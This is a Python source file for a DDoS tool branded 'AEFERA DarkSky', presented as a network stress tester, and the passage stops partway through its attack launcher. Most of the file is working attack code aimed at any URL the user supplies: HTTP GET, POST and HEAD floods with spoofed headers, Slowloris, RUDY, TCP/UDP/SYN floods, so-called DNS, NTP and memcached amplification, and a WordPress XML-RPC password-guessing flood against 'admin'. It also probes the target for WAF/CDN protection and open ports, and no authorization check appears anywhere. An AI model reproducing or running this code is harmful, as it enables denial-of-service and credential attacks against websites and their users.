#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    AEFERA DARKSKY - NETWORK STRESS TOOL                      ║
║                         Coded by: AEFERADarkksy                              ║
║                            Version: Ultimate 3.0                             ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import socket
import struct
import random
import threading
import time
import sys
import os
import ssl
import urllib.request
import urllib.parse
import json
import hashlib
import multiprocessing
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import deque

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

try:
    from colorama import Fore, Back, Style, init
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = GREEN = YELLOW = CYAN = MAGENTA = WHITE = BLUE = ''
        LIGHTRED_EX = LIGHTGREEN_EX = LIGHTYELLOW_EX = LIGHTCYAN_EX = ''
    class Back:
        RED = GREEN = YELLOW = CYAN = MAGENTA = WHITE = ''
    class Style:
        RESET_ALL = BRIGHT = DIM = ''

# ======================= CONSTANTS =======================
VERSION = "3.0 Ultimate"
AUTHOR = "AEFERADarkksy"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://www.youtube.com/",
    "https://www.reddit.com/",
    "https://www.instagram.com/",
    "https://www.linkedin.com/",
]

# ======================= BANNER =======================
def print_banner():
    banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
║{Fore.RED}    ▄▄▄       ▓█████   █████▒▓█████  ██▀███   ▄▄▄                    {Fore.CYAN}║
║{Fore.RED}   ▒████▄     ▓█   ▀ ▓██   ▒ ▓█   ▀ ▓██ ▒ ██▒▒████▄                  {Fore.CYAN}║
║{Fore.RED}   ▒██  ▀█▄   ▒███   ▒████ ░ ▒███   ▓██ ░▄█ ▒▒██  ▀█▄                {Fore.CYAN}║
║{Fore.RED}   ░██▄▄▄▄██  ▒▓█  ▄ ░▓█▒  ░ ▒▓█  ▄ ▒██▀▀█▄  ░██▄▄▄▄██               {Fore.CYAN}║
║{Fore.RED}    ▓█   ▓██▒▒░▒████▒░▒█░    ░▒████▒░██▓ ▒██▒ ▓█   ▓██▒              {Fore.CYAN}║
║{Fore.RED}    ▒▒   ▓▒█░░░░ ▒░ ░ ▒ ░    ░░ ▒░ ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░              {Fore.CYAN}║
║{Fore.YELLOW}              ██████╗  █████╗ ██████╗ ██╗  ██╗███████╗██╗  ██╗██╗   ██╗      {Fore.CYAN}║
║{Fore.YELLOW}              ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██║ ██╔╝╚██╗ ██╔╝      {Fore.CYAN}║
║{Fore.YELLOW}              ██║  ██║███████║██████╔╝█████╔╝ ███████╗█████╔╝  ╚████╔╝       {Fore.CYAN}║
║{Fore.YELLOW}              ██║  ██║██╔══██║██╔══██╗██╔═██╗ ╚════██║██╔═██╗   ╚██╔╝        {Fore.CYAN}║
║{Fore.YELLOW}              ██████╔╝██║  ██║██║  ██║██║  ██╗███████║██║  ██╗   ██║         {Fore.CYAN}║
║{Fore.YELLOW}              ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝         {Fore.CYAN}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Fore.WHITE}                    NETWORK STRESS TESTING TOOL v{VERSION}                   {Fore.CYAN}║
║{Fore.GREEN}                         Coded by: {AUTHOR}                           {Fore.CYAN}║
╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(banner, flush=True)

# ======================= SYSTEM ANALYZER =======================
class SystemAnalyzer:
    """Analyze system specs for optimal attack configuration"""
    
    def __init__(self):
        self.cpu_count = multiprocessing.cpu_count()
        self.cpu_freq = self._get_cpu_freq()
        self.cpu_percent = self._get_cpu_percent()
        self.total_ram = self._get_ram()
        self.available_ram = self._get_available_ram()
        self.network_speed = self._test_network()
        self.os_name = sys.platform
    
    def _get_cpu_freq(self):
        if HAS_PSUTIL:
            try:
                freq = psutil.cpu_freq()
                return freq.current if freq else 2000
            except:
                return 2000
        return 2000
    
    def _get_cpu_percent(self):
        if HAS_PSUTIL:
            try:
                return psutil.cpu_percent(interval=0.5)
            except:
                return 50
        return 50
    
    def _get_ram(self):
        if HAS_PSUTIL:
            try:
                return psutil.virtual_memory().total
            except:
                pass
        return 8 * 1024**3
    
    def _get_available_ram(self):
        if HAS_PSUTIL:
            try:
                return psutil.virtual_memory().available
            except:
                pass
        return 4 * 1024**3
    
    def _test_network(self):
        """Quick network speed estimation"""
        try:
            start = time.time()
            urllib.request.urlopen("http://www.google.com", timeout=3)
            latency = time.time() - start
            if latency < 0.1:
                return 100
            elif latency < 0.3:
                return 50
            elif latency < 0.5:
                return 20
            else:
                return 10
        except:
            return 10
    
    def calculate_optimal_threads(self):
        """Calculate optimal thread count based on system specs"""
        base_threads = self.cpu_count * 75
        
        ram_gb = self.total_ram / (1024**3)
        if ram_gb >= 16:
            ram_multiplier = 2.5
        elif ram_gb >= 8:
            ram_multiplier = 2.0
        elif ram_gb >= 4:
            ram_multiplier = 1.5
        else:
            ram_multiplier = 1.0
        
        if self.network_speed >= 100:
            net_multiplier = 2.0
        elif self.network_speed >= 50:
            net_multiplier = 1.5
        else:
            net_multiplier = 1.0
        
        # CPU availability factor
        cpu_avail = (100 - self.cpu_percent) / 100
        cpu_multiplier = max(0.5, cpu_avail)
        
        optimal = int(base_threads * ram_multiplier * net_multiplier * cpu_multiplier)
        return min(max(optimal, 100), 10000)
    
    def get_recommended_methods(self):
        """Get recommended attack methods based on system"""
        methods = []
        
        # Always recommend these for Layer 7
        methods.extend(["HTTP_FLOOD", "HTTP_POST", "SLOWLORIS", "RUDY"])
        
        # Layer 4
        methods.extend(["TCP_FLOOD", "UDP_FLOOD"])
        
        # Amplification
        methods.extend(["DNS_AMP", "NTP_AMP", "MEMCACHED_AMP"])
        
        # WordPress specific
        methods.append("XMLRPC")
        
        return methods
    
    def display_info(self):
        """Display system analysis"""
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"║{Fore.WHITE}                           SYSTEM ANALYSIS                                    {Fore.CYAN}║")
        print(f"╠══════════════════════════════════════════════════════════════════════════════╣")
        print(f"║{Fore.GREEN}  CPU Cores         : {Fore.YELLOW}{self.cpu_count:<55}{Fore.CYAN}║")
        print(f"║{Fore.GREEN}  CPU Frequency     : {Fore.YELLOW}{self.cpu_freq:.0f} MHz{' ':<48}{Fore.CYAN}║")
        print(f"║{Fore.GREEN}  CPU Usage         : {Fore.YELLOW}{self.cpu_percent:.1f}%{' ':<51}{Fore.CYAN}║")
        print(f"║{Fore.GREEN}  Total RAM         : {Fore.YELLOW}{self.total_ram / (1024**3):.2f} GB{' ':<48}{Fore.CYAN}║")
        print(f"║{Fore.GREEN}  Available RAM     : {Fore.YELLOW}{self.available_ram / (1024**3):.2f} GB{' ':<48}{Fore.CYAN}║")
        print(f"║{Fore.GREEN}  Network Speed     : {Fore.YELLOW}~{self.network_speed} Mbps (estimated){' ':<38}{Fore.CYAN}║")
        print(f"║{Fore.GREEN}  OS Platform       : {Fore.YELLOW}{self.os_name:<55}{Fore.CYAN}║")
        print(f"╠══════════════════════════════════════════════════════════════════════════════╣")
        optimal = self.calculate_optimal_threads()
        methods = self.get_recommended_methods()
        print(f"║{Fore.MAGENTA}  OPTIMAL THREADS   : {Fore.WHITE}{optimal:<55}{Fore.CYAN}║")
        print(f"║{Fore.MAGENTA}  BEST METHODS      : {Fore.WHITE}{', '.join(methods[:5]):<55}{Fore.CYAN}║")
        print(f"╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        return optimal

# ======================= TARGET ANALYZER =======================
class TargetAnalyzer:
    """Analyze target for vulnerabilities and protections"""
    
    def __init__(self, url):
        self.original_url = url
        self.url = self._normalize_url(url)
        self.domain = self._extract_domain()
        self.ip = None
        self.port = 80
        self.has_ssl = 'https' in self.url.lower()
        self.protection = {}
        self.server_info = {}
        self.open_ports = []
    
    def _normalize_url(self, url):
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        return url.rstrip('/')
    
    def _extract_domain(self):
        try:
            from urllib.parse import urlparse
            parsed = urlparse(self.url)
            return parsed.netloc.split(':')[0]
        except:
            return self.url.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
    
    def resolve_ip(self):
        """Resolve domain to IP"""
        try:
            self.ip = socket.gethostbyname(self.domain)
            return self.ip
        except socket.gaierror:
            print(f"{Fore.RED}[!] Cannot resolve domain: {self.domain}{Style.RESET_ALL}")
            return None
    
    def detect_protection(self):
        """Detect WAF/CDN protection"""
        self.protection = {
            'cloudflare': False,
            'akamai': False,
            'cloudfront': False,
            'incapsula': False,
            'sucuri': False,
            'ddos_guard': False,
            'mod_security': False,
            'wordfence': False,
            'unknown_waf': False
        }
        
        try:
            req = urllib.request.Request(self.url, headers={'User-Agent': random.choice(USER_AGENTS)})
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            response = urllib.request.urlopen(req, timeout=10, context=ctx)
            headers = dict(response.headers)
            body = response.read(5000).decode('utf-8', errors='ignore').lower()
            
            self.server_info['status'] = response.status
            self.server_info['server'] = headers.get('Server', 'Unknown')
            
            all_headers = str(headers).lower()
            
            if 'cloudflare' in all_headers or 'cf-ray' in all_headers:
                self.protection['cloudflare'] = True
            if 'akamai' in all_headers:
                self.protection['akamai'] = True
            if 'cloudfront' in all_headers or 'x-amz' in all_headers:
                self.protection['cloudfront'] = True
            if 'incapsula' in all_headers or 'visid_incap' in all_headers:
                self.protection['incapsula'] = True
            if 'sucuri' in all_headers or 'x-sucuri' in all_headers:
                self.protection['sucuri'] = True
            if 'ddos-guard' in all_headers:
                self.protection['ddos_guard'] = True
            if 'mod_security' in all_headers or 'modsecurity' in body:
                self.protection['mod_security'] = True
            if 'wordfence' in all_headers or 'wordfence' in body:
                self.protection['wordfence'] = True
            
            if 'checking your browser' in body or 'ddos protection' in body or 'please wait' in body:
                self.protection['unknown_waf'] = True
                
        except Exception as e:
            self.server_info['error'] = str(e)
        
        return self.protection
    
    def scan_ports(self):
        """Quick port scan"""
        common_ports = [80, 443, 8080, 8443, 21, 22, 25, 53, 110, 143, 3306, 5432, 27017]
        self.open_ports = []
        
        print(f"{Fore.YELLOW}[+] Scanning common ports...{Style.RESET_ALL}")
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((self.ip, port))
                if result == 0:
                    self.open_ports.append(port)
                sock.close()
            except:
                pass
        
        return self.open_ports
    
    def analyze(self):
        """Full target analysis"""
        print(f"\n{Fore.CYAN}[*] Analyzing target: {Fore.WHITE}{self.url}{Style.RESET_ALL}")
        
        print(f"{Fore.YELLOW}[+] Resolving domain...{Style.RESET_ALL}")
        if not self.resolve_ip():
            return None
        print(f"{Fore.GREEN}    IP: {self.ip}{Style.RESET_ALL}")
        
        print(f"{Fore.YELLOW}[+] Detecting protection...{Style.RESET_ALL}")
        self.detect_protection()
        
        self.scan_ports()
        
        return self.get_info()
    
    def get_info(self):
        """Get all target info"""
        return {
            'url': self.url,
            'domain': self.domain,
            'ip': self.ip,
            'port': 443 if self.has_ssl else 80,
            'ssl': self.has_ssl,
            'protection': self.protection,
            'server': self.server_info,
            'open_ports': self.open_ports
        }
    
    def display_info(self):
        """Display target analysis"""
        active_protection = [k.upper() for k, v in self.protection.items() if v]
        
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"║{Fore.WHITE}                           TARGET ANALYSIS                                    {Fore.CYAN}║")
        print(f"╠══════════════════════════════════════════════════════════════════════════════╣")
        print(f"║{Fore.GREEN}  Domain           : {Fore.YELLOW}{self.domain:<56}{Fore.CYAN}║")
        print(f"║{Fore.GREEN}  IP Address       : {Fore.YELLOW}{self.ip or 'N/A':<56}{Fore.CYAN}║")
        print(f"║{Fore.GREEN}  SSL/TLS          : {Fore.YELLOW}{'Yes' if self.has_ssl else 'No':<56}{Fore.CYAN}║")
        print(f"║{Fore.GREEN}  Server           : {Fore.YELLOW}{self.server_info.get('server', 'Unknown')[:55]:<56}{Fore.CYAN}║")
        print(f"║{Fore.GREEN}  Open Ports       : {Fore.YELLOW}{', '.join(map(str, self.open_ports[:10])) or 'N/A':<56}{Fore.CYAN}║")
        print(f"╠══════════════════════════════════════════════════════════════════════════════╣")
        
        if active_protection:
            prot_str = ', '.join(active_protection)[:55]
            print(f"║{Fore.RED}  PROTECTION       : {Fore.WHITE}{prot_str:<56}{Fore.CYAN}║")
            print(f"║{Fore.RED}  STATUS           : {Fore.WHITE}{'PROTECTED - Bypass recommended':<56}{Fore.CYAN}║")
        else:
            print(f"║{Fore.GREEN}  PROTECTION       : {Fore.WHITE}{'None detected':<56}{Fore.CYAN}║")
            print(f"║{Fore.GREEN}  STATUS           : {Fore.WHITE}{'VULNERABLE - All methods effective':<56}{Fore.CYAN}║")
        
        print(f"╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")

# ======================= ATTACK METHODS =======================
class AttackMethods:
    """Collection of real attack methods"""
    
    def __init__(self, target_info, stats):
        self.target = target_info
        self.stats = stats
        self.stop_flag = False
    
    def _create_socket(self, use_ssl=False):
        """Create socket with SSL if needed"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=self.target['domain'])
        
        return sock
    
    def http_flood(self):
        """HTTP GET Flood - High volume requests"""
        while not self.stop_flag:
            try:
                sock = self._create_socket(self.target['ssl'])
                sock.connect((self.target['ip'], self.target['port']))
                
                path = f"/?{random.randint(0, 99999999)}&cache={random.randint(0,99999)}"
                
                request = f"GET {path} HTTP/1.1\r\n"
                request += f"Host: {self.target['domain']}\r\n"
                request += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                request += f"Referer: {random.choice(REFERERS)}\r\n"
                request += f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                request += f"Accept-Language: en-US,en;q=0.5\r\n"
                request += f"Accept-Encoding: gzip, deflate, br\r\n"
                request += f"Connection: keep-alive\r\n"
                request += f"Cache-Control: no-cache\r\n"
                request += f"Pragma: no-cache\r\n"
                request += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
                request += f"\r\n"
                
                for _ in range(random.randint(1, 5)):
                    sock.send(request.encode())
                    self.stats['requests'] += 1
                    self.stats['bytes_sent'] += len(request)
                
                sock.close()
            except:
                self.stats['errors'] += 1
    
    def http_post_flood(self):
        """HTTP POST Flood - Large POST payloads"""
        while not self.stop_flag:
            try:
                sock = self._create_socket(self.target['ssl'])
                sock.connect((self.target['ip'], self.target['port']))
                
                post_data = '&'.join([f"data{i}={''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=100))}" for i in range(20)])
                
                request = f"POST / HTTP/1.1\r\n"
                request += f"Host: {self.target['domain']}\r\n"
                request += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                request += f"Content-Type: application/x-www-form-urlencoded\r\n"
                request += f"Content-Length: {len(post_data)}\r\n"
                request += f"Connection: keep-alive\r\n"
                request += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
                request += f"\r\n"
                request += post_data
                
                sock.send(request.encode())
                self.stats['requests'] += 1
                self.stats['bytes_sent'] += len(request)
                sock.close()
            except:
                self.stats['errors'] += 1
    
    def slowloris(self):
        """Slowloris - Keep connections open"""
        sockets = []
        
        for _ in range(200):
            try:
                sock = self._create_socket(self.target['ssl'])
                sock.connect((self.target['ip'], self.target['port']))
                
                request = f"GET /?{random.randint(0, 99999)} HTTP/1.1\r\n"
                request += f"Host: {self.target['domain']}\r\n"
                request += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                sock.send(request.encode())
                sockets.append(sock)
                self.stats['connections'] += 1
            except:
                pass
        
        while not self.stop_flag:
            for sock in list(sockets):
                try:
                    header = f"X-a-{random.randint(1, 9999)}: {random.randint(1, 99999)}\r\n"
                    sock.send(header.encode())
                    self.stats['requests'] += 1
                    self.stats['bytes_sent'] += len(header)
                except:
                    sockets.remove(sock)
                    self.stats['errors'] += 1
                    try:
                        new_sock = self._create_socket(self.target['ssl'])
                        new_sock.connect((self.target['ip'], self.target['port']))
                        request = f"GET /?{random.randint(0, 99999)} HTTP/1.1\r\n"
                        request += f"Host: {self.target['domain']}\r\n"
                        new_sock.send(request.encode())
                        sockets.append(new_sock)
                        self.stats['connections'] += 1
                    except:
                        pass
            
            time.sleep(15)
    
    def rudy(self):
        """RUDY - Slow POST body"""
        while not self.stop_flag:
            try:
                sock = self._create_socket(self.target['ssl'])
                sock.connect((self.target['ip'], self.target['port']))
                
                content_length = random.randint(100000, 1000000)
                
                request = f"POST / HTTP/1.1\r\n"
                request += f"Host: {self.target['domain']}\r\n"
                request += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                request += f"Content-Type: application/x-www-form-urlencoded\r\n"
                request += f"Content-Length: {content_length}\r\n"
                request += f"Connection: keep-alive\r\n\r\n"
                
                sock.send(request.encode())
                self.stats['requests'] += 1
                
                sent = 0
                while sent < content_length and not self.stop_flag:
                    chunk = f"a={random.randint(0, 9)}&"
                    try:
                        sock.send(chunk.encode())
                        sent += len(chunk)
                        self.stats['bytes_sent'] += len(chunk)
                        time.sleep(random.uniform(0.1, 0.5))
                    except:
                        break
                
                sock.close()
            except:
                self.stats['errors'] += 1
    
    def tcp_flood(self):
        """TCP Connection Flood"""
        while not self.stop_flag:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target['ip'], self.target['port']))
                
                data = random._urandom(random.randint(512, 2048))
                sock.send(data)
                self.stats['requests'] += 1
                self.stats['bytes_sent'] += len(data)
                sock.close()
            except:
                self.stats['errors'] += 1
    
    def udp_flood(self):
        """UDP Flood"""
        while not self.stop_flag:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                ports = [53, 80, 443, 123, 161, 1900, 11211] + [random.randint(1, 65535)]
                port = random.choice(ports)
                
                payload = random._urandom(random.randint(512, 65507))
                
                sock.sendto(payload, (self.target['ip'], port))
                self.stats['requests'] += 1
                self.stats['bytes_sent'] += len(payload)
                sock.close()
            except:
                self.stats['errors'] += 1
    
    def syn_flood(self):
        """SYN Flood (requires raw socket)"""
        while not self.stop_flag:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect_ex((self.target['ip'], self.target['port']))
                self.stats['requests'] += 1
                sock.close()
            except:
                self.stats['errors'] += 1
    
    def dns_amplification(self):
        """DNS Amplification"""
        resolvers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "208.67.222.222", "9.9.9.9"]
        
        while not self.stop_flag:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                # DNS query ANY for google.com
                dns_query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
                dns_query += b'\x06google\x03com\x00'
                dns_query += b'\x00\xff\x00\x01'
                
                resolver = random.choice(resolvers)
                sock.sendto(dns_query, (resolver, 53))
                self.stats['requests'] += 1
                self.stats['bytes_sent'] += len(dns_query)
                sock.close()
            except:
                self.stats['errors'] += 1
    
    def ntp_amplification(self):
        """NTP Amplification"""
        ntp_servers = ["pool.ntp.org", "time.google.com", "time.windows.com", "time.apple.com"]
        
        while not self.stop_flag:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(1)
                
                ntp_req = b'\x17\x00\x03\x2a' + b'\x00' * 4
                
                server = random.choice(ntp_servers)
                try:
                    ip = socket.gethostbyname(server)
                    sock.sendto(ntp_req, (ip, 123))
                    self.stats['requests'] += 1
                    self.stats['bytes_sent'] += len(ntp_req)
                except:
                    pass
                
                sock.close()
            except:
                self.stats['errors'] += 1
    
    def memcached_amplification(self):
        """Memcached Amplification"""
        while not self.stop_flag:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                payload = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
                
                sock.sendto(payload, (self.target['ip'], 11211))
                self.stats['requests'] += 1
                self.stats['bytes_sent'] += len(payload)
                sock.close()
            except:
                self.stats['errors'] += 1
    
    def xmlrpc_flood(self):
        """WordPress XMLRPC Attack"""
        while not self.stop_flag:
            try:
                sock = self._create_socket(self.target['ssl'])
                sock.connect((self.target['ip'], self.target['port']))
                
                xml_data = f"""<?xml version="1.0"?>
<methodCall>
<methodName>system.multicall</methodName>
<params>
<param><value><array><data>
<value><struct>
<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
<member><name>params</name><value><array><data>
<value><string>admin</string></value>
<value><string>{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))}</string></value>
</data></array></value></member>
</struct></value>
</data></array></value></param>
</params>
</methodCall>"""
                
                request = f"POST /xmlrpc.php HTTP/1.1\r\n"
                request += f"Host: {self.target['domain']}\r\n"
                request += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                request += f"Content-Type: text/xml\r\n"
                request += f"Content-Length: {len(xml_data)}\r\n"
                request += f"Connection: close\r\n\r\n"
                request += xml_data
                
                sock.send(request.encode())
                self.stats['requests'] += 1
                self.stats['bytes_sent'] += len(request)
                sock.close()
            except:
                self.stats['errors'] += 1
    
    def http_head_flood(self):
        """HTTP HEAD Flood - Lightweight requests"""
        while not self.stop_flag:
            try:
                sock = self._create_socket(self.target['ssl'])
                sock.connect((self.target['ip'], self.target['port']))
                
                request = f"HEAD /?{random.randint(0, 99999999)} HTTP/1.1\r\n"
                request += f"Host: {self.target['domain']}\r\n"
                request += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                request += f"Connection: keep-alive\r\n\r\n"
                
                for _ in range(10):
                    sock.send(request.encode())
                    self.stats['requests'] += 1
                    self.stats['bytes_sent'] += len(request)
                
                sock.close()
            except:
                self.stats['errors'] += 1

# ======================= ATTACK ENGINE =======================
class AttackEngine:
    """Main attack coordinator"""
    
    METHODS = {
        '1': ('HTTP_FLOOD', 'http_flood', 'HTTP GET Flood - High volume GET requests'),
        '2': ('HTTP_POST', 'http_post_flood', 'HTTP POST Flood - Large POST payloads'),
        '3': ('HTTP_HEAD', 'http_head_flood', 'HTTP HEAD Flood - Lightweight fast requests'),
        '4': ('SLOWLORIS', 'slowloris', 'Slowloris - Connection exhaustion'),
        '5': ('RUDY', 'rudy', 'R-U-Dead-Yet - Slow POST body attack'),
        '6': ('TCP_FLOOD', 'tcp_flood', 'TCP Connection Flood'),
        '7': ('UDP_FLOOD', 'udp_flood', 'UDP Packet Flood - High bandwidth'),
        '8': ('SYN_FLOOD', 'syn_flood', 'SYN Flood - TCP handshake attack'),
        '9': ('DNS_AMP', 'dns_amplification', 'DNS Amplification Attack'),
        '10': ('NTP_AMP', 'ntp_amplification', 'NTP Amplification Attack'),
        '11': ('MEMCACHED', 'memcached_amplification', 'Memcached Amplification'),
        '12': ('XMLRPC', 'xmlrpc_flood', 'WordPress XMLRPC Attack'),
        '13': ('MIXED_L7', None, 'MIXED LAYER 7 - HTTP+POST+HEAD+SLOWLORIS'),
        '14': ('MIXED_L4', None, 'MIXED LAYER 4 - TCP+UDP+SYN'),
        '15': ('ALL_OUT', None, 'ALL OUT - Maximum Power All Methods'),
    }
    
    def __init__(self, target_info, threads, duration):
        self.target = target_info
        self.threads = threads
        self.duration = duration
        self.stop_flag = False
        self.stats = {
            'requests': 0,
            'bytes_sent': 0,
            'errors': 0,
            'connections': 0
        }
        self.start_time = None
        self.attack_methods = None
    
    def display_methods(self):
        """Display available attack methods"""
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"║{Fore.WHITE}                           ATTACK METHODS                                     {Fore.CYAN}║")
        print(f"╠══════════════════════════════════════════════════════════════════════════════╣")
        
        print(f"║{Fore.YELLOW}  --- LAYER 7 (APPLICATION) ---                                               {Fore.CYAN}║")
        for key in ['1', '2', '3', '4', '5', '12']:
            name, _, desc = self.METHODS[key]
            print(f"║  {Fore.GREEN}[{key:>2}]{Fore.WHITE} {name:<12} - {desc:<52}{Fore.CYAN}║")
        
        print(f"║{Fore.YELLOW}  --- LAYER 4 (TRANSPORT) ---                                                 {Fore.CYAN}║")
        for key in ['6', '7', '8']:
            name, _, desc = self.METHODS[key]
            print(f"║  {Fore.GREEN}[{key:>2}]{Fore.WHITE} {name:<12} - {desc:<52}{Fore.CYAN}║")
        
        print(f"║{Fore.YELLOW}  --- AMPLIFICATION ---                                                       {Fore.CYAN}║")
        for key in ['9', '10', '11']:
            name, _, desc = self.METHODS[key]
            print(f"║  {Fore.GREEN}[{key:>2}]{Fore.WHITE} {name:<12} - {desc:<52}{Fore.CYAN}║")
        
        print(f"║{Fore.YELLOW}  --- COMBO ATTACKS ---                                                       {Fore.CYAN}║")
        for key in ['13', '14', '15']:
            name, _, desc = self.METHODS[key]
            color = Fore.RED if key == '15' else Fore.MAGENTA
            print(f"║  {color}[{key:>2}]{Fore.WHITE} {name:<12} - {desc:<52}{Fore.CYAN}║")
        
        print(f"╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    def select_method(self):
        """Let user select attack method"""
        self.display_methods()
        
        while True:
            choice = input(f"\n{Fore.GREEN}[>] Select method (1-15): {Style.RESET_ALL}").strip()
            if choice in self.METHODS:
                return choice
            print(f"{Fore.RED}[!] Invalid choice{Style.RESET_ALL}")
    
    def start_attack(self, method_choice):
        """Start the attack"""
        self.start_time = time.time()
        self.stop_flag = False
        
        self.attack_methods = AttackMethods(self.target, self.stats)
        
        method_name = self.METHODS[method_choice][0]
        print(f"\n{Fore.RED}╔══════════════════════════════════════════════════════════════════════════════╗", flush=True)
        print(f"║{Fore.WHITE}                           ATTACK STARTING                                    {Fore.RED}║", flush=True)
        print(f"╠══════════════════════════════════════════════════════════════════════════════╣", flush=True)
        print(f"║{Fore.YELLOW}  Method    : {Fore.WHITE}{method_name:<63}{Fore.RED}║", flush=True)
        print(f"║{Fore.YELLOW}  Target    : {Fore.WHITE}{self.target['domain']} ({self.target['ip']}){' ':<35}{Fore.RED}║", flush=True)
        print(f"║{Fore.YELLOW}  Threads   : {Fore.WHITE}{self.threads:<63}{Fore.RED}║", flush=True)
        print(f"║{Fore.YELLOW}  Duration  : {Fore.WHITE}{self.duration} seconds{' ':<53}{Fore.RED}║", flush=True)
        print(f"╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n", flush=True)
        
        # Determine which methods to use
        if method_choice == '13':  # Mixed L7
            methods_to_use = ['http_flood', 'http_post_flood', 'http_head_flood', 'slowloris']
        elif method_choice == '14':  # Mixed L4
            methods_to_use = ['tcp_flood', 'udp_flood', 'syn_flood']
        elif method_choice == '15':  # All out
            methods_to_use = [
                'http_flood', 'http_post_flood', 'http_head_flood',
                'tcp_flood', 'udp_flood', 'slowloris'
            ]
        else:
            methods_to_use = [self.METHODS[method_choice][1]]
        
        # Calculate threads per method
        threads_per_method = max(1, self.threads // len(methods_to_use))
        total_threads = 0
        # Start attack threads
        for method_func_name in methods_to_use:
            method_func = getattr(self.attack_methods, method_func_name, None)
            if not callable(method_func):
                print(f"{Fore.RED}[!] Method {method_func_name} not found!{Style.RESET_ALL}", flush=True)
                continue
            for _ in range(threads_per_method):
                t = threading.Thread(target=self._safe_attack, args=(method_func,), daemon=True)
                t.start()
                total_threads += 1
        print(f"{Fore.YELLOW}[DEBUG] Started {total_threads} attack threads ({threads_per_method} per method, {len(methods_to_use)} methods).{Style.RESET_ALL}", flush=True)
        if total_threads == 0:
            print(f"{Fore.RED}[!] No attack threads started! Check method configuration.{Style.RESET_ALL}", flush=True)
        # Stats display thread
        stats_thread = threading.Thread(target=self._display_stats, daemon=True)
